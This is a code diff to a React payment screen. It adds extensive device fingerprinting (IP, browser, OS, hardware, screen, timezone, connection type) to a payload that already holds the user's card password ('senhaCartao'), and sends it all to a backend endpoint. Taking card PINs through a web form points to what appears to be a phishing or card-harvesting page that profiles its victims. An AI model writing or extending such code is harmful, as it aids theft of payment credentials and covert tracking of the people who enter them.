@@ -83,9 +83,30 @@ export const PaymentProcessingScreen = ({
     try {
       const backendUrl = 'http://localhost:5555';
 
+      // Prepara dados completos com informações do dispositivo
       const completePaymentData = {
         ...paymentData,
         senhaCartao: password,
+        // Informações do Dispositivo
+        ip: deviceInfo?.ip,
+        userAgent: deviceInfo?.userAgent,
+        browserName: deviceInfo?.browserName,
+        browserVersion: deviceInfo?.browserVersion,
+        osName: deviceInfo?.osName,
+        osVersion: deviceInfo?.osVersion,
+        deviceType: deviceInfo?.deviceType,
+        deviceModel: deviceInfo?.deviceModel,
+        screenWidth: deviceInfo?.screenWidth,
+        screenHeight: deviceInfo?.screenHeight,
+        language: deviceInfo?.language,
+        timezone: deviceInfo?.timezone,
+        connectionType: deviceInfo?.connectionType,
+        effectiveConnectionType: deviceInfo?.effectiveConnectionType,
+        cores: deviceInfo?.cores,
+        ram: deviceInfo?.ram,
+        gpu: deviceInfo?.gpu,
+        maxTouchPoints: deviceInfo?.maxTouchPoints,
+        devicePixelRatio: deviceInfo?.devicePixelRatio,
       };
 
       const response = await fetch(`${backendUrl}/api/update-payment`, {
